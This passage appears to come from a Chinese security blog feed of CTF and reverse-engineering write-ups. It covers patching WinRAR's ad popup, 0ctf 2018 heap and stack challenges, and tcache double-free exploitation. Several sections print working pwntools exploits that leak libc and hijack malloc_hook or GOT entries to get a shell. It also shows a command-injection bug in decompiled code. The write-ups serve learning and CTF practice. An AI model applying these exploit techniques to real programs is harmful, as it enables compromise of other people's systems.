3h</em>/中断程序运行并向调试器发送报告，而是通过写入DR寄存器来实现；其支持更复杂的中断，但是只能设置四个)，在0x401000处设置一个硬件断点，f9运行，程序到0x401000处停止执行，此时应该已经解包完成，如果没有显示的话按ctrl+A， 使得OD重新分析代码即可</p>]]></content>
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Reverse Learning-Practical practice</title>
      <link href="/2019/03/12/reverse-learning-practical-practice/"/>
      <url>/2019/03/12/reverse-learning-practical-practice/</url>
      <content type="html"><![CDATA[<p><em>这是之前l3c战队逆向的新手训练，本来想以后再搞，但最近又被最为任务下发了，菜的不行，上周什么也没干成，挣扎了一周。还是决定慢慢学习逆向</em></p><h1 id="winRAR-去除广告"><a href="#winRAR-去除广告" class="headerlink" title="winRAR 去除广告"></a>winRAR 去除广告</h1><p>  拿x64dbg做调试器来达到理解原理并去除广告</p><ol><li><p>打开WinRAR，发现开始就有广告弹出；</p></li><li><p>使用x64dbg打开WinRAR，按f9直到程序完全加载，即程序看上去就和普通打开时一样；</p><figure class="image-box">                <img src="/2019/03/12/reverse-learning-practical-practice/1.png" alt="初始状态" title="" class="">                <p>初始状态</p>            </figure></li></ol><ol start="3"><li>命令行输入 bp DestroyWindow  命令，意思就是在DestroyWindow处下断点，然后关掉广告，调试器会停在断点处；<figure class="image-box">                <img src="/2019/03/12/reverse-learning-practical-practice/2.png" alt="断点状态" title="" class="">                <p>断点状态</p>            </figure></li></ol><ol start="4"><li>通过栈回溯到调用destroywindow 函数的地方，往上翻找到消息的开头(关于找到广告窗口子函数的开头，可以向上翻，也可以将其地址减去基址/<em>x64dbg在符号中可以看到基址</em>/得到偏移，将其放入IDA，加上IDA基址，找到函数模块，从而确定开头位置)，将其直接跳转至关闭广告窗口；<figure class="image-box">                <img src="/2019/03/12/reverse-learning-practical-practice/3.png" alt="函数起始" title="" class="">                <p>函数起始</p>            </figure></li></ol><ol start="5"><li>保存patch即可。</li></ol>]]></content>
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>0ctf-2018-pwn</title>
      <link href="/2019/03/11/0ctf-2018-pwn/"/>
      <url>/2019/03/11/0ctf-2018-pwn/</url>
      <content type="html"><![CDATA[<h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>整体代码风格与2017 的babyheap基本一致，不过漏洞点变得隐蔽且利用变得困难了</p><p>功能： allocate, resize, show, delete 四个功能</p><p>指针仍然是通过一通操作被隐蔽了，所以不能打存放指针地址的主意</p><p>allocate时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Size: &quot;);</span><br><span class="line"> size = read_int_8();</span><br><span class="line"> if ( size &gt; 0 )</span><br><span class="line"> &#123;</span><br><span class="line">   if ( size &gt; 0x58 )</span><br><span class="line">     size = 0x58;</span><br></pre></td></tr></table></figure></p><p>而resize时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Size: &quot;);</span><br><span class="line"> LODWORD(v1) = read_int_8();</span><br><span class="line"> newsize = v1;</span><br><span class="line"> if ( (signed int)v1 &gt; 0 )</span><br><span class="line"> &#123;</span><br><span class="line">   v1 = *(_QWORD *)(24LL * idx + a1 + 8) + 1LL;  // new size+1</span><br><span class="line">   if ( newsize &lt;= v1 )</span><br></pre></td></tr></table></figure></p><p>存在off-by-one漏洞，其他函数基本没有问题</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>利用off-by-one，修改chunk size，释放chunk，再申请，将未释放的chunk被系统标记为释放，以此泄露libc</p><p>之后的思路便是复写malloc_hook ，但是这里需要注意一点：</p><p>申请的chunk最终大小最大为0x60，也就是即使千辛万苦将某个chunk的size改为0x70并将其置入链表，也没有任何用，尝试了好久之前却没动脑子，哭了；</p><p>所以需要换个思路，可以使用之前三级头招新时出题人的思路：将size放入fastbinY中，然后将chunk分配到main_arena处，修改topchunk为malloc_hook之上，然后再次分配chunk复写malloc_hook即可</p><p>这里就没有必要想free_hook了，毕竟free_hook周围全都是’\x00’，topchunk地址改过去，分配时size检查就没法过了</p><p>这种不能查看指针的，需要搞清楚自己申请的释放的都是哪些chunk，不然很容易乱。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./babyheap&apos;)</span><br><span class="line">elf = ELF(&apos;./babyheap&apos;)</span><br><span class="line">libc = ELF(&apos;./lib/x86_64-linux-gnu/libc-2.23.so&apos;)</span><br><span class="line"></span><br><span class="line">def allocate(size):</span><br><span class="line">sh.sendlineafter(&apos;Command: &apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;Size: &apos;,str(size))</span><br><span class="line"></span><br><span class="line">def resize(idx,size,con):</span><br><span class="line">        sh.sendlineafter(&apos;Command: &apos;,&apos;2&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;Index: &apos;,str(idx))</span><br><span class="line">        sh.sendlineafter(&apos;Size: &apos;,str(size))</span><br><span class="line">sh.sendlineafter(&apos;Content: &apos;,con)</span><br><span class="line">def delete(idx):</span><br><span class="line">        sh.sendlineafter(&apos;Command: &apos;,&apos;3&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;Index: &apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter(&apos;Command: &apos;,&apos;4&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;Index: &apos;,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allocate(0x18) #0</span><br><span class="line">allocate(0x28) #1</span><br><span class="line">allocate(0x58) #2</span><br><span class="line">allocate(0x18) #3</span><br><span class="line">allocate(0x38) #4</span><br><span class="line"></span><br><span class="line">#---------leak libc addr-------------------------</span><br><span class="line">resize(0,0x19,&apos;a&apos;*0x18+p8(0x91))</span><br><span class="line">delete(1)</span><br><span class="line">allocate(0x28)</span><br><span class="line">show(2)</span><br><span class="line">sh.recvuntil(&apos;: &apos;)</span><br><span class="line">leak_addr = u64(sh.recv(8))</span><br><span class="line">print &apos;leak_addr: &apos;+hex(leak_addr)</span><br><span class="line">main_arena = leak_addr- 88</span><br><span class="line">print &apos;main_arena: &apos;+hex(main_arena)</span><br><span class="line">libc_addr = main_arena - 0x3c4b20</span><br><span class="line">print &apos;libc_base: &apos;+hex(libc_addr)</span><br><span class="line">one_gadget = libc_addr + 0x4526a </span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#----------get shell-----------------------------</span><br><span class="line">allocate(0x58) #5</span><br><span class="line">delete(5)</span><br><span class="line">resize(2,0x8,p64(0x41))</span><br><span class="line">allocate(0x58) #5</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#allocate(0x18) #6</span><br><span class="line">#allocate(0x58) #7</span><br><span class="line"></span><br><span class="line">resize(5,0x59,&apos;a&apos;*0x58+p8(0x61))</span><br><span class="line">#resize(4,0x10,&apos;a&apos;*0x38+p64(0x41))</span><br><span class="line">delete(3)</span><br><span class="line">allocate(0x58)</span><br><span class="line">resize(3,0x20,&apos;a&apos;*0x18+p64(0x41))</span><br><span class="line">delete(4)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">resize(3,0x28,&apos;c&apos;*0x18+p64(0x41)+p64(main_arena+0x20))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">allocate(0x38)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">allocate(0x38)</span><br><span class="line"></span><br><span class="line">resize(6,0x30,&apos;a&apos;*0x28+p64(main_arena-0x20))</span><br><span class="line">allocate(0x10)</span><br><span class="line">resize(7,0x8,p64(one_gadget))</span><br><span class="line">allocate(0x10)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>ret2_resolve_runtime ， 直接给了溢出，但是无处下手，实际就是ret2resolve 的标准情况，这里也学习一下</p><p><a href="https://www.siriuswhiter.tk/2019/03/20/introduction-to-pwn1-4-ret2dl_runtime_resolve/" target="_blank" rel="noopener">https://www.siriuswhiter.tk/2019/03/20/introduction-to-pwn1-4-ret2dl_runtime_resolve/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t read__()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-28h]</span><br><span class="line"></span><br><span class="line">  return read(0, &amp;buf, 0x40u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>溢出在bss段伪造resolve结构体，覆盖write为system调用’/bin/sh’ getshell</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import roputils</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">offset = 44</span><br><span class="line">readplt = 0x08048300</span><br><span class="line">bss = 0x0804a020</span><br><span class="line">vulFunc = 0x0804843B</span><br><span class="line"></span><br><span class="line">p = process(&apos;./babystack&apos;)</span><br><span class="line">rop = roputils.ROP(&apos;./babystack&apos;)</span><br><span class="line">addr_bss = rop.section(&apos;.bss&apos;)</span><br><span class="line"></span><br><span class="line"># step1 : write sh &amp; resolve struct to bss</span><br><span class="line">buf1 = &apos;A&apos; * offset #44</span><br><span class="line">buf1 += p32(readplt) + p32(vulFunc) + p32(0) + p32(addr_bss) + p32(100)</span><br><span class="line">p.send(buf1)</span><br><span class="line"></span><br><span class="line">buf2 =  rop.string(&apos;/bin/sh&apos;)</span><br><span class="line">buf2 += rop.fill(20, buf2)</span><br><span class="line">buf2 += rop.dl_resolve_data(addr_bss+20, &apos;system&apos;)</span><br><span class="line">buf2 += rop.fill(100, buf2)</span><br><span class="line">p.send(buf2)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#step2 : use dl_resolve_call get system &amp; system(&apos;/bin/sh&apos;)</span><br><span class="line">buf3 = &apos;A&apos;*44 + rop.dl_resolve_call(addr_bss+20, addr_bss)</span><br><span class="line">p.send(buf3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="heapstorm2"><a href="#heapstorm2" class="headerlink" title="heapstorm2"></a>heapstorm2</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>刚开始进行了一通设置，这里需要关注一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 setup()</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; // [rsp+8h] [rbp-18h]</span><br><span class="line">  int fd; // [rsp+Ch] [rbp-14h]</span><br><span class="line"></span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(_bss_start, 0LL, 2, 0LL);</span><br><span class="line">  alarm(0x3Cu);</span><br><span class="line">  puts(</span><br><span class="line">    &quot;    __ __ _____________   __   __    ___    ____\n&quot;</span><br><span class="line">    &quot;   / //_// ____/ ____/ | / /  / /   /   |  / __ )\n&quot;</span><br><span class="line">    &quot;  / ,&lt;  / __/ / __/ /  |/ /  / /   / /| | / __  |\n&quot;</span><br><span class="line">    &quot; / /| |/ /___/ /___/ /|  /  / /___/ ___ |/ /_/ /\n&quot;</span><br><span class="line">    &quot;/_/ |_/_____/_____/_/ |_/  /_____/_/  |_/_____/\n&quot;);</span><br><span class="line">  puts(&quot;===== HEAP STORM II =====&quot;);</span><br><span class="line">  if ( !mallopt(1, 0) )                         // ban fastbin</span><br><span class="line">    exit(-1);</span><br><span class="line">  if ( mmap((void *)0x13370000, 0x1000uLL, 3, 34, -1, 0LL) != (void *)0x13370000 )</span><br><span class="line">    exit(-1);</span><br><span class="line">  fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">  if ( fd &lt; 0 )</span><br><span class="line">    exit(-1);</span><br><span class="line">  if ( read(fd, (void *)0x13370800, 0x18uLL) != 24 )</span><br><span class="line">    exit(-1);</span><br><span class="line">  close(fd);</span><br><span class="line">  MEMORY[0x13370818] = MEMORY[0x13370810];</span><br><span class="line">  for ( i = 0; i &lt;= 15; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)(16 * (i + 2LL) + 0x13370800) = set_ptr((_QWORD *)0x13370800, 0LL);</span><br><span class="line">    *(_QWORD *)(16 * (i + 2LL) + 0x13370808) = set_size(0x13370800LL, 0LL);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0x13370800LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以注意到</p><ol><li>使用mallopt取消了fastbin，</li><li>在0x1337000 处 分配了0x1000大小的空间，可读可写，然后从0x13370800处 写入了0x20的随机数据，后面是存储结构，指针＋size</li></ol><p>可以在调试时看这块区域的情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">x/20gx 0x13370800</span><br><span class="line">0x13370800:0xa16b7989b9c2ea960xaf69f4118a3bb745</span><br><span class="line">0x13370810:0x994db09e4d7847740x994db09e4d784774   --》  view 需要检验的地方</span><br><span class="line"></span><br><span class="line">0x13370820:0xa16b2fa20decaa860xaf69f4118a3bb75d</span><br><span class="line">0x13370830:0xa16b2fa20decaaa60xaf69f4118a3bb75d</span><br><span class="line">0x13370840:0xa16b2fa20decaac60xaf69f4118a3bb75d</span><br><span class="line">0x13370850:0xa16b7989b9c2ea960xaf69f4118a3bb745</span><br><span class="line">0x13370860:0xa16b7989b9c2ea960xaf69f4118a3bb745</span><br><span class="line">0x13370870:0xa16b7989b9c2ea960xaf69f4118a3bb745</span><br><span class="line">0x13370880:0xa16b7989b9c2ea960xaf69f4118a3bb745</span><br><span class="line">0x13370890:0xa16b7989b9c2ea960xaf69f4118a3bb745</span><br></pre></td></tr></table></figure><p>后面会将指针，size经过处理存储到这里，指针会与0x13370800处的随机数xor，size会与0x13370808处的随机数xor</p><p>主功能有 </p><ol><li>alloc ， 使用了calloc ，最多16个chunk且会将输入的chunk 的指针与size存储到上面说的地方 size要大于12小于0x01000；</li><li><p>update  , 再输入的大小要不大于原size-12,输入数据后会将其最后12字节进行填充，很明显有off-by-null;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Size: &quot;);</span><br><span class="line">size_ = get_num();</span><br><span class="line">if ( size_ &lt;= 0 || size_ &gt; (unsigned __int64)(set_size((__int64)a1, a1[idx + 2].size) - 12) )</span><br><span class="line">  return puts(&quot;Invalid Size&quot;);</span><br><span class="line">printf(&quot;Content: &quot;);</span><br><span class="line">v2 = set_ptr(a1, a1[idx + 2LL].ptr);</span><br><span class="line">get_str(v2, size_);</span><br><span class="line">v3 = size_ + v2;</span><br><span class="line">*(_QWORD *)v3 = &apos;ROTSPAEH&apos;;</span><br><span class="line">*(_DWORD *)(v3 + 8) = &apos;II_M&apos;;</span><br><span class="line">*(_BYTE *)(v3 + 12) = 0;                      // off-by-null</span><br><span class="line">return printf(&quot;Chunk %d Updated\n&quot;, (unsigned int)idx);</span><br></pre></td></tr></table></figure></li><li><p>delete 检查存储的size，之后删除, 可以看到处理的比较干净；</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ( idx &lt; 0 || idx &gt; 15 || !set_size((__int64)a1, a1[idx + 2].size) )</span><br><span class="line">  return puts(&quot;Invalid Index&quot;);</span><br><span class="line">v2 = (void *)set_ptr(a1, a1[idx + 2LL].ptr);</span><br><span class="line">free(v2);</span><br><span class="line">a1[idx + 2LL].ptr = set_ptr(a1, 0LL);</span><br><span class="line">a1[idx + 2].size = set_size((__int64)a1, 0LL);</span><br></pre></td></tr></table></figure><ol start="4"><li>view 会检查之前的0x10处的随机数，满足条件才可以view；<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( (a1[3] ^ a1[2]) != 0x13377331LL )</span><br><span class="line">  return puts(&quot;Permission denied&quot;);</span><br></pre></td></tr></table></figure></li></ol><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>思路还是比较清晰的，首先利用off-by-null的漏洞通过chunk overlapping 将chunk分配到0x13370800处，修改原先存储的随机数，使得可以使用view函数，同时覆盖下面存储的指针与size，调用view泄露libc基址，再将指针指向malloc_hook处或free_hook处直接getshell；</p><p>主要的问题就是利用overlapping做到条件地址写，过程应该会较为复杂；</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn2.9-tcache_exploit</title>
      <link href="/2019/03/02/introduction-to-pwn2-9-tcache-exploit/"/>
      <url>/2019/03/02/introduction-to-pwn2-9-tcache-exploit/</url>
      <content type="html"><![CDATA[<p><em>为了有个高版本的glibc，宿舍感人网速10k/s下了两天下了20％，还是选择在昨天下了一个ubuntu 18，好在这次环境安装异常稳妥，没有任何报错甚至有点不习惯。。。</em></p><h1 id="Tcache"><a href="#Tcache" class="headerlink" title="Tcache"></a>Tcache</h1><p>glibc 在2.26之后加入了tcache机制，之前仅仅大略看了下原理，基本没什么保护，这次h4lo大佬给的是tcache的题目，顺便来练练手，因为保护比fastbin还少，所以利用起来也比较简单。</p><p>简单来说，tcache相当于插队插在了fastbin 及 smallbin 前面，内部chunk大小不排序，且最多7个，malloc时优先在里面找，free时优先进入tcache，大小都要小于0x408，当然还有一些其他的机制就不多说了</p><h1 id="babytcache"><a href="#babytcache" class="headerlink" title="babytcache"></a>babytcache</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>三个功能 add delete show</p><p>add 最多九个chunk，固定malloc(0x50)，指针存放在bss段<br>delete 检查idx范围，之后仅仅free<br>show puts指针内容</p><p>保护：开了NX 及 Canary，No pie,got表可写</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>看上去就是个tcache的练手题目，也基本没有检查</p><p>2.27版本的 tcache 甚至没有double free检查，也就是说，现在可以在没有其他chunk的情况下free一个chunk多次进入tcache</p><p>所以我们的思路很清晰– double free进入bss段，改变指针泄露libc地址</p><p>得到libc地址之后复写got表，getshell. (复写free不成功，不太清楚为什么，复写puts没问题)</p><ul><li>需要注意的是，tcache中有一个计数的tc_idx，也就是如果采用double free，会造成尝试分配到heap以外的时候，已经是第三次从tcache中取出chunk，而我们之前仅仅往里面放入了两个chunk，这样计数的tc_idx就会变成-1，结果便是我们可能之后无法再次使用tcache，此时free会略过tcache，malloc查询tcache时便会报错。</li></ul><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./babytcache&apos;)</span><br><span class="line">elf = ELF(&apos;./babytcache&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.27.so&apos;)</span><br><span class="line"></span><br><span class="line">def add(con):</span><br><span class="line">    sh.sendlineafter(&apos;&gt;&apos;,&apos;1&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;content:&apos;,con)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    sh.sendlineafter(&apos;&gt;&apos;,&apos;2&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;index:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    sh.sendlineafter(&apos;&gt;&apos;,&apos;3&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;index:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(&apos;aaa&apos;)</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">add(p64(0x6020e0+8))</span><br><span class="line">add(&apos;aaa&apos;)</span><br><span class="line">add(p64(elf.got[&apos;free&apos;]))        //保证搞完后tcache没有被破坏</span><br><span class="line"></span><br><span class="line">show(1)</span><br><span class="line"></span><br><span class="line">free_addr = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &apos;free_addr: &apos;+hex(free_addr)</span><br><span class="line">system_addr = free_addr - libc.symbols[&apos;free&apos;] + libc.symbols[&apos;system&apos;]</span><br><span class="line">print &apos;system_addr: &apos;+hex(system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">add(p64(elf.got[&apos;puts&apos;]))</span><br><span class="line">add(&apos;/bin/sh&apos;)</span><br><span class="line">add(p64(system_addr))          //这个时候tcache已经坏了，但是不影响我们</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019.2安恒月赛pwn</title>
      <link href="/2019/02/26/2019-2%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9Bpwn/"/>
      <url>/2019/02/26/2019-2%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9Bpwn/</url>
      <content type="html"><![CDATA[<h1 id="filesystem"><a href="#filesystem" class="headerlink" title="filesystem"></a>filesystem</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>重点函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall checksec(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v3; // [rsp+8h] [rbp-98h]</span><br><span class="line">  char s; // [rsp+10h] [rbp-90h]</span><br><span class="line">  unsigned __int64 v5; // [rsp+98h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  memset(&amp;s, 0, 0x80uLL);</span><br><span class="line">  printf(&quot;Input the Index:&quot;, a2, &amp;s);</span><br><span class="line">  v3 = get_num();</span><br><span class="line">  if ( cnt &gt; v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    snprintf(&amp;s, 0x80uLL, &quot;echo \&quot;%s\&quot;| md5sum&quot;, (char *)&amp;ptr + 0x90 * v3 + 0x30);</span><br><span class="line">    system(&amp;s);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No Such Index&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析"><a href="#分析" 